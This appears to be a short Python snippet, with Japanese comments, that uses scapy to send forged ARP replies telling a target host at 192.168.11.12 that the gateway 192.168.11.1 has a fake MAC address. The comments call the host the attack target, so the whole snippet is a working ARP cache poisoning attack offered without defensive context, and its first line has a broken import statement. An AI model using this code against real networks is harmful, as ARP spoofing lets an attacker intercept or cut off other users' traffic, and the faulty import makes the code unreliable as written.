import scapy.all import ARP, send

send(ARP(op=2, psrc="192.168.11.1",
               pdst="192.168.11.12",
               hwsrc="11:11:11:11:11:11"), count=5)
# op=2: 応答を表す
# psrc: ARPキャッシュ内の書き換え対象IPアドレス(デフォルトゲートウェイ)
# pdst: 攻撃対象端末のIPアドレス
# hwsrc: 書き換え後の偽のMACアドレス
# count: 送信パケットの個数
